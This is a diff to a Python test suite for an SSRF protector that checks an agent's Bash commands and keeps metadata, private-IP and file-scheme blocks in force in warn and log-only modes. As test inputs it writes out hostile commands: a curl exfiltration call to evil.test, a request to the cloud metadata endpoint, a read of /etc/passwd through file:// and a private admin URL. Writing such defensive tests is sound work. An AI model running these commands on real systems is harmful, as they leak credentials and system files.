@@ -367,29 +367,79 @@ class TestActionModes:
         assert "SSRF" in msg
 
     def test_warn_mode_allows_with_warning(self):
-        """Test warn mode logs but allows execution."""
-        protector = SSRFProtector({"action": "warn"})
+        """Test warn mode logs but allows execution for configurable patterns."""
+        protector = SSRFProtector({
+            "action": "warn",
+            "additional_blocked_domains": ["evil.test"],
+        })
         should_block, msg = protector.check(
             "Bash",
-            {"command": "curl http://169.254.169.254"}
+            {"command": "curl http://evil.test/exfil"}
         )
 
-        assert not should_block  # Execution allowed
+        assert not should_block  # Execution allowed for configurable pattern
         assert msg is not None  # But warning shown
         assert "⚠️" in msg
         assert "SSRF" in msg
         assert "warn mode" in msg.lower()
 
-    def test_log_only_mode_silent(self):
-        """Test log-only mode allows execution without user warning."""
+    def test_log_only_mode_returns_message(self):
+        """Test log-only mode allows execution but returns message for violation logging."""
+        protector = SSRFProtector({
+            "action": "log-only",
+            "additional_blocked_domains": ["evil.test"],
+        })
+        should_block, msg = protector.check(
+            "Bash",
+            {"command": "curl http://evil.test/exfil"}
+        )
+
+        assert not should_block  # Execution allowed
+        assert msg is not None  # Message returned for violation logging
+        assert "log-only" in msg.lower()
+
+    def test_immutable_pattern_blocks_in_warn_mode(self):
+        """Immutable SSRF patterns (metadata endpoints) always block regardless of action mode."""
+        protector = SSRFProtector({"action": "warn"})
+        should_block, msg = protector.check(
+            "Bash",
+            {"command": "curl http://169.254.169.254/latest/meta-data/"}
+        )
+
+        assert should_block, "Immutable pattern must block even in warn mode"
+        assert msg is not None
+        assert "immutable" in msg.lower()
+
+    def test_immutable_pattern_blocks_in_log_only_mode(self):
+        """Immutable SSRF patterns always block regardless of log-only action mode."""
         protector = SSRFProtector({"action": "log-only"})
         should_block, msg = protector.check(
             "Bash",
             {"command": "curl http://169.254.169.254"}
         )
 
-        assert not should_block  # Execution allowed
-        assert msg is None  # No warning to user (logged silently)
+        assert should_block, "Immutable pattern must block even in log-only mode"
+        assert msg is not None
+
+    def test_immutable_dangerous_scheme_blocks_in_warn_mode(self):
+        """Dangerous URL schemes are immutable and always block."""
+        protector = SSRFProtector({"action": "warn"})
+        should_block, msg = protector.check(
+            "Bash",
+            {"command": "curl file:///etc/passwd"}
+        )
+
+        assert should_block, "Dangerous scheme must block even in warn mode"
+
+    def test_immutable_private_ip_blocks_in_log_only_mode(self):
+        """Private IP ranges are immutable and always block."""
+        protector = SSRFProtector({"action": "log-only"})
+        should_block, msg = protector.check(
+            "Bash",
+            {"command": "curl http://10.0.0.1/admin"}
+        )
+
+        assert should_block, "Private IP must block even in log-only mode"
 
 
 class TestConfigurationOverrides:
